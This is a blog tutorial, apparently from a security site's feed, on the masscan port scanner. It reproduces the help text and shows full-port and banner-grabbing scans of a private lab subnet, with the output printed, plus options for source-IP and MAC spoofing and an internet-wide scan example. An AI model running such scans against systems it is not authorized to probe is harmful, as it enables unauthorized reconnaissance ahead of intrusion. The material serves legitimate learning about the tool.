Masscan (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>)
Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}
TARGET SPECIFICATION:
  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)
  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254
  -iL <inputfilename>: Input from list of hosts/networks
  &mdash;exclude &lt;host1[,host2][,host3],&hellip;>: Exclude hosts/networks
  &mdash;excludefile &lt;exclude_file>: Exclude list from file
  &mdash;randomize-hosts: Randomize order of hosts (default)
HOST DISCOVERY:
  -Pn: Treat all hosts as online (default)
  -n: Never do DNS resolution (default)
SCAN TECHNIQUES:
  -sS: TCP SYN (always on, default)
SERVICE/VERSION DETECTION:
  &mdash;banners: get the banners of the listening service if available. The</p>

<pre><code>default timeout for waiting to recieve data is 30 seconds.
</code></pre>

<p>PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports</p>

<pre><code>Ex: -p22; -p1-65535; -p 111,137,80,139,8080
</code></pre>

<p>TIMING AND PERFORMANCE:
  &mdash;max-rate <number>: Send packets no faster than <number> per second
  &mdash;connection-timeout <number>: time in seconds a TCP connection will</p>

<pre><code>timeout while waiting for banner data from a port.
</code></pre>

<p>FIREWALL/IDS EVASION AND SPOOFING:
  -S/&mdash;source-ip &lt;IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/&mdash;source-port <portnum>: Use given port number
  &mdash;ttl <val>: Set IP time-to-live field
  &mdash;spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
OUTPUT:
  &mdash;output-format <format>: Sets output to binary/list/unicornscan/json/grepable/xml
  &mdash;output-file <file>: Write scan results to file. If &mdash;output-format is</p>

<pre><code> not given default is xml
</code></pre>

<p>  -oL/-oJ/-oG/-oB/-oX/-oU <file>: Output scan in List/JSON/Grepable/Binary/XML/Unicornscan format,</p>

<pre><code> respectively, to the given filename. Shortcut for
 --output-format &lt;format&gt; --output-file &lt;file&gt;
</code></pre>

<p>  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  &mdash;open: Only show open (or possibly open) ports
  &mdash;packet-trace: Show all packets sent and received
  &mdash;iflist: Print host interfaces and routes (for debugging)
  &mdash;append-output: Append to rather than clobber specified output files
  &mdash;resume <filename>: Resume an aborted scan
MISC:
  &mdash;send-eth: Send using raw ethernet frames (default)
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80
  masscan 23.0.0.0/0 -p80 &mdash;banners -output-format binary &mdash;output-filename internet.scan
  masscan &mdash;open &mdash;banners &mdash;readscan internet.scan -oG internet_scan.grepable
SEE (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>) FOR MORE HELP
```</p>

<p>Manpage: <a href="http://manpages.org/masscan/8">http://manpages.org/masscan/8</a></p>

<h2>masscan usage</h2>

<ul>
<li>look at the current configuration</li>
</ul>


<p>```
root@kali:~# masscan &mdash;echo
rate =     100.00
randomize-hosts = true
seed = 9262294816069822464
shard = 1/1</p>

<h1>ADAPTER SETTINGS</h1>

<p>adapter =
adapter-ip = 0.0.0.0
adapter-mac = 00:00:00:00:00:00
router-mac = 00:00:00:00:00:00</p>

<h1>OUTPUT/REPORTING SETTINGS</h1>

<p>output-format = unknown(0)
show = open,,
output-filename =
rotate = 0
rotate-dir = .
rotate-offset = 0
rotate-filesize = 0
pcap =</p>

<h1>TARGET SELECTION (IP, PORTS, EXCLUDES)</h1>

<p>retries = 0
ports =</p>

<p>capture = cert
nocapture = html
nocapture = heartbleed</p>

<p>min-packet = 60
```</p>

<ul>
<li>check installation</li>
</ul>


<p><code>
masscan --regress
regression test: success!
</code></p>

<ul>
<li>full port scan on local subnet</li>
</ul>


<p>```
root@kali:~# masscan -p0-65535 192.168.217.0/24 &mdash;rate 100000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:02:34 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [65536 ports/host]
Discovered open port 443/tcp on 192.168.217.131                              <br/>
Discovered open port 139/tcp on 192.168.217.133                              <br/>
Discovered open port 139/tcp on 192.168.217.134                              <br/>
Discovered open port 139/tcp on 192.168.217.131                              <br/>
Discovered open port 111/tcp on 192.168.217.131                              <br/>
Discovered open port 23/tcp on 192.168.217.133                               <br/>
Discovered open port 21/tcp on 192.168.217.133                               <br/>
Discovered open port 22/tcp on 192.168.217.131                               <br/>
Discovered open port 22/tcp on 192.168.217.135                               <br/>
Discovered open port 5432/tcp on 192.168.217.133                             <br/>
Discovered open port 135/tcp on 192.168.217.134                              <br/>
Discovered open port 22/tcp on 192.168.217.133                               <br/>
Discovered open port 25/tcp on 192.168.217.133                               <br/>
Discovered open port 53/tcp on 192.168.217.133                               <br/>
Discovered open port 3632/tcp on 192.168.217.133                             <br/>
Discovered open port 80/tcp on 192.168.217.135                               <br/>
Discovered open port 80/tcp on 192.168.217.131                               <br/>
Discovered open port 80/tcp on 192.168.217.133                               <br/>
Discovered open port 445/tcp on 192.168.217.131                              <br/>
Discovered open port 445/tcp on 192.168.217.133                              <br/>
Discovered open port 445/tcp on 192.168.217.134                              <br/>
Discovered open port 8180/tcp on 192.168.217.133                             <br/>
Discovered open port 8009/tcp on 192.168.217.133                             <br/>
Discovered open port 3306/tcp on 192.168.217.133 <br/>
```</p>

<p>The scan was done in a couple of minutes. You might be wondering, how does this tool scan the entire internet in 3 minutes if it took the same length of time for a puny subnet? Well, there are some limitations. To get the most of its speed, you need the proper adapter and driver. Also notice that I rate-limited it to 100k packets per second, because I didn&rsquo;t want my local network to blow up! If you want to benchmark masscan&rsquo;s performance, look on its homepage, under the Performance testing section.</p>

<ul>
<li>grab banners of open ports</li>
</ul>


<p>```
root@kali:~# masscan 192.168.217.0/24 -p22,80,139,445,3306 &mdash;banners &mdash;source-ip 192.168.217.150 &mdash;rate 100000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:18:27 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [5 ports/host]
Discovered open port 80/tcp on 192.168.217.133                               <br/>
Discovered open port 139/tcp on 192.168.217.134                              <br/>
Discovered open port 22/tcp on 192.168.217.133                               <br/>
Discovered open port 139/tcp on 192.168.217.133                              <br/>
Discovered open port 22/tcp on 192.168.217.131                               <br/>
Discovered open port 80/tcp on 192.168.217.131                               <br/>
Discovered open port 445/tcp on 192.168.217.131                              <br/>
Discovered open port 139/tcp on 192.168.217.131                              <br/>
Discovered open port 22/tcp on 192.168.217.135                               <br/>
Discovered open port 80/tcp on 192.168.217.135                               <br/>
Banner on port 22/tcp on 192.168.217.135: [ssh] SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
Banner on port 22/tcp on 192.168.217.133: [ssh] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
Banner on port 22/tcp on 192.168.217.131: [ssh] SSH-2.0-OpenSSH_6.6.1        <br/>
Discovered open port 445/tcp on 192.168.217.134                              <br/>
Discovered open port 445/tcp on 192.168.217.133                              <br/>
Discovered open port 3306/tcp on 192.168.217.133                             <br/>
Banner on port 3306/tcp on 192.168.217.133: [unknown] \x3e\x00\x00\x00\x0a5.0.51a-3ubuntu5\x00\x07\x00\x00\x00M<code>yb]-d3\x00,\xaa\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q^e</code>0o`r\x3crLb\x00
Banner on port 80/tcp on 192.168.217.131: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:35 GMT\x0d\x0aServer: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips\x0d\x0aLast-Modified: Tue, 02 Aug 2016 13:07:09 GMT\x0d\x0aETag: \x2211-5391664f1e697\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 17\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0a\x0d
Banner on port 80/tcp on 192.168.217.133: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:36 GMT\x0d\x0aServer: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\x0d\x0aLast-Modified: Wed, 17 Mar 2010 14:08:25 GMT\x0d\x0aETag: \x22107f7-2d-481ffa5ca8840\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 45\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0a\x0d
```</p>

<p>For this option to work, you have to give masscan its own IP address on the local subnet, something unused by another device. In fact, the recommendation from its homepage is to use it with its separate IP address whenever possible.</p>

<p>And here is how the XML output of the previous scan would look in a spreadsheet:</p>

<p><img class="center" src="/images/tools/masscan-xml.png" title="&lsquo;masscan xml&rsquo; &lsquo;masscan xml output&rsquo;" ></p>

<p>Some other features are:</p>

<ul>
<li><p>output formats in xml, binary, grepable, list, or JSON</p></li>
<li><p>resume scans</p></li>
<li><p>exclude targets</p></li>
<li><p>runs in Linux, Windows, and Mac OS X</p></li>
</ul>


<h3>More resources</h3>

<ul>
<li><p><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html">Robert Graham post on masscan</a></p></li>
<li><p><a href="https://josephpierini.blogspot.com/2016/06/using-masscan-with-top-ports.html">select common ports with Nmap and feed them to Masscan</a></p></li>
</ul>


<p>```
/ Your own qualities will help prevent \
\ your advancement in the world.       /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
